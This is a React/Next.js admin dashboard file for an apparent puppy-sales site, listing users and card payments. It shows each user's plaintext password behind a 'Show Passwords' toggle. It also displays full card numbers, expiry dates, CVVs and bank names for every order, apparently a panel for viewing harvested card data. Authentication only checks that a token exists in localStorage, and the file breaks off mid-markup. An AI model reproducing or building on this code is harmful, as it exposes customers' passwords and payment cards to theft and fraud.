"use client";
import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import {
  Users,
  Eye,
  EyeOff,
  Search,
  Filter,
  AlertTriangle,
  Shield,
  Calendar,
  Mail,
  Phone,
  MapPin,
  Activity,
  Trash2,
  Lock,
  Unlock,
  CreditCard,
  DollarSign,
  CheckCircle,
  Clock,
  User,
  Grid3X3,
  List,
} from "lucide-react";
import Navbar from "@/components/Navbar/Navbar";
import Footer from "@/components/Footer.jsx/page";

const AdminDashboard = () => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [filterRole, setFilterRole] = useState("all");
  const [filterStatus, setFilterStatus] = useState("all");
  const [showPasswords, setShowPasswords] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [checkingAuth, setCheckingAuth] = useState(true);
  const [orders, setOrders] = useState([]);
  const [showCardDetails, setShowCardDetails] = useState(false);
  const [activeTab, setActiveTab] = useState("users");
  const [viewMode, setViewMode] = useState("cards"); // "cards" or "table"
  const router = useRouter();

  useEffect(() => {
    checkAuthentication();
    loadOrders();
  }, []);

  const loadOrders = () => {
    const storedOrders = JSON.parse(localStorage.getItem("orders") || "[]");
    setOrders(storedOrders);
  };

  const checkAuthentication = async () => {
    const adminToken = localStorage.getItem("adminToken");

    if (!adminToken) {
      router.push("/admin/login");
      return;
    }

    // Simple token check - if token exists, we're authenticated
    // The API calls will handle proper authentication
    setIsAuthenticated(true);
    setCheckingAuth(false);
    fetchUsers();
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setIsAuthenticated(false);
    router.push("/admin/login");
  };

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const response = await fetch("/api/admin/users", {
        headers: {
          Authorization: `Bearer ${localStorage.getItem("adminToken")}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setUsers(data.users);
      } else {
        localStorage.removeItem("adminToken");
        router.push("/admin/login");
      }
    } catch (error) {
      console.error("Error fetching users:", error);
    } finally {
      setLoading(false);
    }
  };

  const toggleUserStatus = async (userId, currentStatus) => {
    try {
      const response = await fetch(`/api/admin/users/${userId}/toggle-status`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${localStorage.getItem("adminToken")}`,
        },
        body: JSON.stringify({ isActive: !currentStatus }),
      });

      if (response.ok) {
        // Update local state
        setUsers(
          users.map((user) =>
            user._id === userId ? { ...user, isActive: !currentStatus } : user
          )
        );
      }
    } catch (error) {
      console.error("Error toggling user status:", error);
    }
  };

  const deleteUser = async (userId) => {
    if (
      !confirm(
        "Are you sure you want to delete this user? This action cannot be undone."
      )
    ) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/users/${userId}`, {
        method: "DELETE",
        headers: {
          Authorization: `Bearer ${localStorage.getItem("adminToken")}`,
        },
      });

      if (response.ok) {
        setUsers(users.filter((user) => user._id !== userId));
      }
    } catch (error) {
      console.error("Error deleting user:", error);
    }
  };

  const filteredUsers = users.filter((user) => {
    const matchesSearch =
      user.firstName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      user.lastName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      user.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      user.phone?.includes(searchTerm);

    const matchesRole = filterRole === "all" || user.role === filterRole;
    const matchesStatus =
      filterStatus === "all" ||
      (filterStatus === "active" && user.isActive) ||
      (filterStatus === "inactive" && !user.isActive);

    return matchesSearch && matchesRole && matchesStatus;
  });

  // Show loading while checking authentication
  if (checkingAuth) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Checking authentication...</p>
        </div>
      </div>
    );
  }

  // Don't show dashboard if not authenticated
  if (!isAuthenticated) {
    return null; // Will redirect to login
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6 sm:mb-8">
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
            <div>
              <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 flex items-center gap-3">
                <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-red-600" />
                Admin Dashboard
              </h1>
              <p className="text-gray-600 mt-2">
                Monitor and manage registered users
              </p>
            </div>
            <button
              onClick={handleLogout}
              className="flex items-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors w-full sm:w-auto justify-center"
            >
              Logout
            </button>
          </div>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-6 sm:mb-8">
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm">Total Users</p>
                <p className="text-2xl sm:text-3xl font-bold text-gray-900">
                  {users.length}
                </p>
              </div>
              <Users className="w-6 h-6 sm:w-8 sm:h-8 text-blue-600" />
            </div>
          </div>
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm">Active Users</p>
                <p className="text-2xl sm:text-3xl font-bold text-green-600">
                  {users.filter((u) => u.isActive).length}
                </p>
              </div>
              <Activity className="w-6 h-6 sm:w-8 sm:h-8 text-green-600" />
            </div>
          </div>
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm">Inactive Users</p>
                <p className="text-2xl sm:text-3xl font-bold text-red-600">
                  {users.filter((u) => !u.isActive).length}
                </p>
              </div>
              <AlertTriangle className="w-6 h-6 sm:w-8 sm:h-8 text-red-600" />
            </div>
          </div>
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm">Today's Registrations</p>
                <p className="text-2xl sm:text-3xl font-bold text-purple-600">
                  {
                    users.filter((u) => {
                      const today = new Date().toDateString();
                      const userDate = new Date(u.createdAt).toDateString();
                      return today === userDate;
                    }).length
                  }
                </p>
              </div>
              <Calendar className="w-6 h-6 sm:w-8 sm:h-8 text-purple-600" />
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6 sm:mb-8">
          <div className="flex space-x-1 bg-gray-100 p-1 rounded-lg">
            <button
              onClick={() => setActiveTab("users")}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                activeTab === "users"
                  ? "bg-white text-gray-900 shadow-sm"
                  : "text-gray-600 hover:text-gray-900"
              }`}
            >
              <Users className="w-4 h-4 inline mr-2" />
              Users Management
            </button>
            <button
              onClick={() => setActiveTab("payments")}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                activeTab === "payments"
                  ? "bg-white text-gray-900 shadow-sm"
                  : "text-gray-600 hover:text-gray-900"
              }`}
            >
              <CreditCard className="w-4 h-4 inline mr-2" />
              Payment History
            </button>
          </div>
        </div>

        {/* Payment Stats */}
        {activeTab === "payments" && (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-6 sm:mb-8">
            <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm">Total Orders</p>
                  <p className="text-2xl sm:text-3xl font-bold text-gray-900">
                    {orders.length}
                  </p>
                </div>
                <CreditCard className="w-6 h-6 sm:w-8 sm:h-8 text-blue-600" />
              </div>
            </div>
            <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm">Completed</p>
                  <p className="text-2xl sm:text-3xl font-bold text-green-600">
                    {
                      orders.filter(
                        (order) =>
                          order.status === "completed" ||
                          order.status === "deposit_paid"
                      ).length
                    }
                  </p>
                </div>
                <CheckCircle className="w-6 h-6 sm:w-8 sm:h-8 text-green-600" />
              </div>
            </div>
            <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm">Processing</p>
                  <p className="text-2xl sm:text-3xl font-bold text-yellow-600">
                    {
                      orders.filter(
                        (order) =>
                          order.status === "processing" ||
                          order.status === "pending_bank_contact"
                      ).length
                    }
                  </p>
                </div>
                <Clock className="w-6 h-6 sm:w-8 sm:h-8 text-yellow-600" />
              </div>
            </div>
            <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-600 text-sm">Total Revenue</p>
                  <p className="text-2xl sm:text-3xl font-bold text-purple-600">
                    $
                    {orders
                      .reduce((sum, order) => {
                        const amount = (
                          order.depositAmount || order.amount
                        ).replace(/[$,]/g, "");
                        return sum + parseFloat(amount || 0);
                      }, 0)
                      .toLocaleString()}
                  </p>
                </div>
                <DollarSign className="w-6 h-6 sm:w-8 sm:h-8 text-purple-600" />
              </div>
            </div>
          </div>
        )}

        {/* Filters */}
        {activeTab === "users" && (
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6 sm:mb-8">
            <div className="flex flex-col lg:flex-row gap-4">
              <div className="flex-1">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 sm:w-5 sm:h-5" />
                  <input
                    type="text"
                    placeholder="Search users by name, email, or phone..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>
              <select
                value={filterRole}
                onChange={(e) => setFilterRole(e.target.value)}
                className="px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              >
                <option value="all">All Roles</option>
                <option value="user">Users</option>
                <option value="admin">Admins</option>
              </select>
              <select
                value={filterStatus}
                onChange={(e) => setFilterStatus(e.target.value)}
                className="px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
              >
                <option value="all">All Status</option>
                <option value="active">Active</option>
                <option value="inactive">Inactive</option>
              </select>
              <button
                onClick={() => setShowPasswords(!showPasswords)}
                className="flex items-center gap-2 px-4 py-3 bg-yellow-600 text-white rounded-xl hover:bg-yellow-700 transition-colors justify-center"
              >
                {showPasswords ? (
                  <EyeOff className="w-4 h-4" />
                ) : (
                  <Eye className="w-4 h-4" />
                )}
                <span className="hidden sm:inline">
                  {showPasswords ? "Hide" : "Show"} Passwords
                </span>
              </button>
            </div>
          </div>
        )}

        {/* Payment Filters */}
        {activeTab === "payments" && (
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6 sm:mb-8">
            <div className="flex flex-col lg:flex-row gap-4">
              <div className="flex-1">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 sm:w-5 sm:h-5" />
                  <input
                    type="text"
                    placeholder="Search orders by puppy name, user email, or order ID..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>
              <div className="flex gap-2">
                {/* View Mode Toggle */}
                <div className="flex bg-gray-100 rounded-xl p-1">
                  <button
                    onClick={() => setViewMode("cards")}
                    className={`flex items-center space-x-2 px-3 py-2 rounded-lg transition-all duration-200 ${
                      viewMode === "cards"
                        ? "bg-white shadow-sm text-blue-600"
                        : "text-gray-600 hover:text-gray-800"
                    }`}
                  >
                    <Grid3X3 className="w-4 h-4" />
                    <span className="hidden sm:inline">Cards</span>
                  </button>
                  <button
                    onClick={() => setViewMode("table")}
                    className={`flex items-center space-x-2 px-3 py-2 rounded-lg transition-all duration-200 ${
                      viewMode === "table"
                        ? "bg-white shadow-sm text-blue-600"
                        : "text-gray-600 hover:text-gray-800"
                    }`}
                  >
                    <List className="w-4 h-4" />
                    <span className="hidden sm:inline">Table</span>
                  </button>
                </div>

                <button
                  onClick={() => setShowCardDetails(!showCardDetails)}
                  className="flex items-center gap-2 px-4 py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition-colors justify-center"
                >
                  {showCardDetails ? (
                    <EyeOff className="w-4 h-4" />
                  ) : (
                    <Eye className="w-4 h-4" />
                  )}
                  <span className="hidden sm:inline">
                    {showCardDetails ? "Hide" : "Show"} Card Details
                  </span>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Content */}
        {activeTab === "users" ? (
          /* Users Table */
          <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50">
                  {activeTab === "users" ? (
                    <tr>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        User
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Contact
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Password
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Role
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Status
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Created
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Actions
                      </th>
                    </tr>
                  ) : (
                    <tr>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Order ID
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Customer
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Puppy
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Amount
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Card Details
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Status
                      </th>
                      <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                        Date
                      </th>
                    </tr>
                  )}
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {loading ? (
                    <tr>
                      <td
                        colSpan="7"
                        className="px-4 sm:px-6 py-8 text-center text-gray-500"
                      >
                        Loading {activeTab === "users" ? "users" : "orders"}...
                      </td>
                    </tr>
                  ) : activeTab === "users" ? (
                    filteredUsers.length === 0 ? (
                      <tr>
                        <td
                          colSpan="7"
                          className="px-4 sm:px-6 py-8 text-center text-gray-500"
                        >
                          No users found
                        </td>
                      </tr>
                    ) : (
                      filteredUsers.map((user) => (
                        <tr key={user._id} className="hover:bg-gray-50">
                          <td className="px-4 sm:px-6 py-4">
                            <div>
                              <p className="font-medium text-gray-900">
                                {user.firstName} {user.lastName}
                              </p>
                              <p className="text-xs sm:text-sm text-gray-500">
                                ID: {user._id}
                              </p>
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <Mail className="w-3 h-3 sm:w-4 sm:h-4 text-gray-400" />
                                <span className="text-xs sm:text-sm">
                                  {user.email}
                                </span>
                              </div>
                              {user.phone && (
                                <div className="flex items-center gap-2">
                                  <Phone className="w-3 h-3 sm:w-4 sm:h-4 text-gray-400" />
                                  <span className="text-xs sm:text-sm">
                                    {user.phone}
                                  </span>
                                </div>
                              )}
                              {user.address?.city && (
                                <div className="flex items-center gap-2">
                                  <MapPin className="w-3 h-3 sm:w-4 sm:h-4 text-gray-400" />
                                  <span className="text-xs sm:text-sm">
                                    {user.address.city}, {user.address.state}
                                  </span>
                                </div>
                              )}
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="flex items-center gap-2">
                              <span className="text-xs sm:text-sm font-mono bg-gray-100 px-2 py-1 rounded">
                                {showPasswords ? user.password : "••••••••"}
                              </span>
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <span
                              className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                                user.role === "admin"
                                  ? "bg-red-100 text-red-800"
                                  : "bg-blue-100 text-blue-800"
                              }`}
                            >
                              {user.role}
                            </span>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <span
                              className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                                user.isActive
                                  ? "bg-green-100 text-green-800"
                                  : "bg-red-100 text-red-800"
                              }`}
                            >
                              {user.isActive ? "Active" : "Inactive"}
                            </span>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="text-xs sm:text-sm text-gray-900">
                              {new Date(user.createdAt).toLocaleDateString()}
                            </div>
                            <div className="text-xs text-gray-500">
                              {new Date(user.createdAt).toLocaleTimeString()}
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="flex items-center gap-2">
                              <button
                                onClick={() =>
                                  toggleUserStatus(user._id, user.isActive)
                                }
                                className={`p-2 rounded-lg transition-colors ${
                                  user.isActive
                                    ? "bg-red-100 text-red-600 hover:bg-red-200"
                                    : "bg-green-100 text-green-600 hover:bg-green-200"
                                }`}
                                title={
                                  user.isActive
                                    ? "Deactivate User"
                                    : "Activate User"
                                }
                              >
                                {user.isActive ? (
                                  <Lock className="w-3 h-3 sm:w-4 sm:h-4" />
                                ) : (
                                  <Unlock className="w-3 h-3 sm:w-4 sm:h-4" />
                                )}
                              </button>
                              <button
                                onClick={() => deleteUser(user._id)}
                                className="p-2 bg-red-100 text-red-600 rounded-lg hover:bg-red-200 transition-colors"
                                title="Delete User"
                              >
                                <Trash2 className="w-3 h-3 sm:w-4 sm:h-4" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )
                  ) : // Payment Orders Section
                  orders.length === 0 ? (
                    <tr>
                      <td
                        colSpan="7"
                        className="px-4 sm:px-6 py-8 text-center text-gray-500"
                      >
                        No orders found
                      </td>
                    </tr>
                  ) : (
                    orders
                      .filter((order) => {
                        const matchesSearch =
                          order.id
                            ?.toLowerCase()
                            .includes(searchTerm.toLowerCase()) ||
                          order.puppy
                            ?.toLowerCase()
                            .includes(searchTerm.toLowerCase()) ||
                          order.user
                            ?.toLowerCase()
                            .includes(searchTerm.toLowerCase());
                        return matchesSearch;
                      })
                      .map((order) => (
                        <tr key={order.id} className="hover:bg-gray-50">
                          <td className="px-4 sm:px-6 py-4">
                            <div className="text-sm font-medium text-gray-900">
                              {order.id}
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="flex items-center space-x-2">
                              <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                                <User className="w-4 h-4 text-blue-600" />
                              </div>
                              <div>
                                <div className="text-sm font-medium text-gray-900">
                                  {order.user}
                                </div>
                                <div className="text-xs text-gray-500">
                                  Customer
                                </div>
                              </div>
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="flex items-center space-x-3">
                              <div className="w-10 h-10 bg-amber-100 rounded-lg flex items-center justify-center">
                                <div className="w-6 h-6 bg-amber-500 rounded-full"></div>
                              </div>
                              <div>
                                <div className="text-sm font-medium text-gray-900">
                                  {order.puppy}
                                </div>
                                <div className="text-xs text-gray-500">
                                  {order.breed}
                                </div>
                              </div>
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="space-y-2">
                              {/* Primary Amount */}
                              <div className="flex items-center space-x-2">
                                <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
                                  <DollarSign className="w-3 h-3 text-green-600" />
                                </div>
                                <div>
                                  <div className="text-sm font-semibold text-gray-900">
                                    {order.depositAmount || order.amount}
                                  </div>
                                  <div className="text-xs text-gray-500">
                                    {order.paymentType === "deposit"
                                      ? "Deposit Paid"
                                      : "Full Payment"}
                                  </div>
                                </div>
                              </div>

                              {/* Payment Breakdown */}
                              {order.totalAmount && (
                                <div className="pl-8 space-y-1">
                                  <div className="flex items-center justify-between text-xs">
                                    <span className="text-gray-500">
                                      Total:
                                    </span>
                                    <span className="font-medium text-gray-700">
                                      {order.totalAmount}
                                    </span>
                                  </div>
                                  {order.remainingAmount && (
                                    <div className="flex items-center justify-between text-xs">
                                      <span className="text-gray-500">
                                        Remaining:
                                      </span>
                                      <span className="font-medium text-orange-600">
                                        {order.remainingAmount}
                                      </span>
                                    </div>
                                  )}
                                </div>
                              )}
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="space-y-2">
                              {/* Card Preview */}
                              <div className="flex items-center space-x-3">
                                <div className="relative">
                                  <div className="w-8 h-5 bg-gradient-to-r from-blue-600 to-blue-800 rounded-sm shadow-sm flex items-center justify-center">
                                    <CreditCard className="w-3 h-3 text-white" />
                                  </div>
                                  <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border border-white"></div>
                                </div>
                                <div>
                                  <div className="text-sm font-medium text-gray-900">
                                    {order.cardDetails.cardNumber.replace(
                                      /\d(?=\d{4})/g,
                                      "*"
                                    )}
                                  </div>
                                  <div className="text-xs text-gray-500">
                                    {order.cardDetails.brand} •{" "}
                                    {order.cardDetails.last4}
                                  </div>
                                </div>
                              </div>

                              {/* Toggle Button */}
                              <button
                                onClick={() =>
                                  setShowCardDetails(!showCardDetails)
                                }
                                className="flex items-center space-x-1 text-xs text-blue-600 hover:text-blue-800 transition-colors"
                              >
                                {showCardDetails ? (
                                  <>
                                    <EyeOff className="w-3 h-3" />
                                    <span>Hide Details</span>
                                  </>
                                ) : (
                                  <>
                                    <Eye className="w-3 h-3" />
                                    <span>View Details</span>
                                  </>
                                )}
                              </button>

                              {/* Detailed Card Information */}
                              {showCardDetails && (
                                <div className="mt-3 p-4 bg-gradient-to-br from-slate-50 to-gray-100 rounded-xl border border-gray-200 shadow-sm">
                                  <div className="space-y-3">
                                    {/* Card Header */}
                                    <div className="flex items-center justify-between pb-2 border-b border-gray-200">
                                      <h4 className="text-sm font-semibold text-gray-800">
                                        Payment Details
                                      </h4>
                                      {order.cardDetails.verified && (
                                        <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
                                          <CheckCircle className="w-3 h-3 mr-1" />
                                          Verified
                                        </span>
                                      )}
                                    </div>

                                    {/* Card Information Grid */}
                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                      <div className="space-y-2">
                                        <div className="flex items-center space-x-2">
                                          <User className="w-3 h-3 text-gray-400" />
                                          <div>
                                            <div className="text-xs text-gray-500">
                                              Cardholder
                                            </div>
                                            <div className="text-sm font-medium text-gray-900">
                                              {order.cardDetails.cardholderName}
                                            </div>
                                          </div>
                                        </div>

                                        <div className="flex items-center space-x-2">
                                          <Calendar className="w-3 h-3 text-gray-400" />
                                          <div>
                                            <div className="text-xs text-gray-500">
                                              Expiry
                                            </div>
                                            <div className="text-sm font-medium text-gray-900">
                                              {order.cardDetails.expiryDate}
                                            </div>
                                          </div>
                                        </div>

                                        <div className="flex items-center space-x-2">
                                          <Shield className="w-3 h-3 text-gray-400" />
                                          <div>
                                            <div className="text-xs text-gray-500">
                                              CVV
                                            </div>
                                            <div className="text-sm font-mono text-gray-900">
                                              {order.cardDetails.cvv}
                                            </div>
                                          </div>
                                        </div>
                                      </div>

                                      <div className="space-y-2">
                                        <div className="flex items-center space-x-2">
                                          <CreditCard className="w-3 h-3 text-gray-400" />
                                          <div>
                                            <div className="text-xs text-gray-500">
                                              Full Number
                                            </div>
                                            <div className="text-sm font-mono text-gray-900">
                                              {order.cardDetails.cardNumber}
                                            </div>
                                          </div>
                                        </div>

                                        {order.cardDetails.bank && (
                                          <div className="flex items-center space-x-2">
                                            <div className="w-3 h-3 bg-blue-100 rounded flex items-center justify-center">
                                              <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                                            </div>
                                            <div>
                                              <div className="text-xs text-gray-500">
                                                Bank
                                              </div>
                                              <div className="text-sm font-medium text-gray-900">
                                                {order.cardDetails.bank}
                                              </div>
                                            </div>
                                          </div>
                                        )}

                                        {order.cardDetails.country && (
                                          <div className="flex items-center space-x-2">
                                            <div className="w-3 h-3 bg-green-100 rounded flex items-center justify-center">
                                              <div className="w-2 h-2 bg-green-600 rounded-full"></div>
                                            </div>
                                            <div>
                                              <div className="text-xs text-gray-500">
                                                Country
                                              </div>
                                              <div className="text-sm font-medium text-gray-900">
                                                {order.cardDetails.country}
                                              </div>
                                            </div>
                                          </div>
                                        )}
                                      </div>
                                    </div>

                                    {/* Transaction Details */}
                                    {(order.transactionId ||
                                      order.processingTime) && (
                                      <div className="pt-2 border-t border-gray-200">
                                        <div className="space-y-2">
                                          {order.transactionId && (
                                            <div className="flex items-center space-x-2">
                                              <div className="w-3 h-3 bg-purple-100 rounded flex items-center justify-center">
                                                <div className="w-2 h-2 bg-purple-600 rounded-full"></div>
                                              </div>
                                              <div>
                                                <div className="text-xs text-gray-500">
                                                  Transaction ID
                                                </div>
                                                <div className="text-sm font-mono text-gray-900">
                                                  {order.transactionId}
                                                </div>
                                              </div>
                                            </div>
                                          )}

                                          {order.processingTime && (
                                            <div className="flex items-center space-x-2">
                                              <Clock className="w-3 h-3 text-gray-400" />
                                              <div>
                                                <div className="text-xs text-gray-500">
                                                  Processed
                                                </div>
                                                <div className="text-sm text-gray-900">
                                                  {new Date(
                                                    order.processingTime
                                                  ).toLocaleString()}
                                                </div>
                                              </div>
                                            </div>
                                          )}
                                        </div>
                                      </div>
                                    )}
                                  </div>
                                </div>
                              )}
                            </div>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <span
                              className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                                order.status === "completed"
                                  ? "bg-green-100 text-green-800"
                                  : order.status === "deposit_paid"
                                  ? "bg-blue-100 text-blue-800"
                                  : order.status === "pending_bank_contact"
                                  ? "bg-yellow-100 text-yellow-800"
                                  : order.status === "processing"
                                  ? "bg-yellow-100 text-yellow-800"
                                  : "bg-red-100 text-red-800"
                              }`}
                            >
                              {order.status === "deposit_paid"
                                ? "Deposit Paid"
                                : order.status === "pending_bank_contact"
                                ? "Pending Bank Contact"
                                : order.status}
                            </span>
                          </td>
                          <td className="px-4 sm:px-6 py-4">
                            <div className="text-sm text-gray-900">
                              {new Date(order.date).toLocaleDateString()}
                            </div>
                          </td>
                        </tr>
                      ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        ) : /* Payment Views */
        viewMode === "cards" ? (
          /* Cards View */
          <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
            {orders
              .filter((order) => {
                const searchLower = searchTerm.toLowerCase();
                return (
                  order.puppy.toLowerCase().includes(searchLower) ||
                  order.user.toLowerCase().includes(searchLower) ||
                  order.id.toLowerCase().includes(searchLower)
                );
              })
              .map((order) => (
                <div
                  key={order.id}
                  className="bg-white rounded-2xl shadow-lg p-6 hover:shadow-xl transition-shadow duration-200"
                >
                  {/* Order Header */}
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-3">
                      <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center">
                        <CreditCard className="w-5 h-5 text-blue-600" />
                      </div>
                      <div>
                        <h3 className="text-sm font-semibold text-gray-900">
                          Order #{order.id}
                        </h3>
                        <p className="text-xs text-gray-500">
                          {new Date(order.date).toLocaleDateString()}
                        </p>
                      </div>
                    </div>
                    <span
                      className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                        order.status === "completed"
                          ? "bg-green-100 text-green-800"
                          : order.status === "pending_bank_contact"
                          ? "bg-yellow-100 text-yellow-800"
                          : order.status === "deposit_paid"
                          ? "bg-blue-100 text-blue-800"
                          : "bg-gray-100 text-gray-800"
                      }`}
                    >
                      {order.status === "completed"
                        ? "Completed"
                        : order.status === "pending_bank_contact"
                        ? "Pending Bank Contact"
                        : order.status === "deposit_paid"
                        ? "Deposit Paid"
                        : order.status}
                    </span>
                  </div>

                  {/* Customer Info */}
                  <div className="mb-4">
                    <div className="flex items-center space-x-2 mb-2">
                      <User className="w-4 h-4 text-gray-400" />
                      <span className="text-sm font-medium text-gray-900">
                        {order.user}
                      </span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-6 h-6 bg-amber-100 rounded flex items-center justify-center">
                        <div className="w-3 h-3 bg-amber-500 rounded-full"></div>
                      </div>
                      <div>
                        <div className="text-sm font-medium text-gray-900">
                          {order.puppy}
                        </div>
                        <div className="text-xs text-gray-500">
                          {order.breed}
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Payment Info */}
                  <div className="mb-4 p-4 bg-gray-50 rounded-xl">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2">
                        <DollarSign className="w-4 h-4 text-green-600" />
                        <span className="text-sm font-semibold text-gray-900">
                          {order.depositAmount || order.amount}
                        </span>
                      </div>
                      <span className="text-xs text-gray-500">
                        {order.paymentType === "deposit"
                          ? "Deposit Paid"
                          : "Full Payment"}
                      </span>
                    </div>
                    {order.totalAmount && (
                      <div className="space-y-1 text-xs">
                        <div className="flex justify-between">
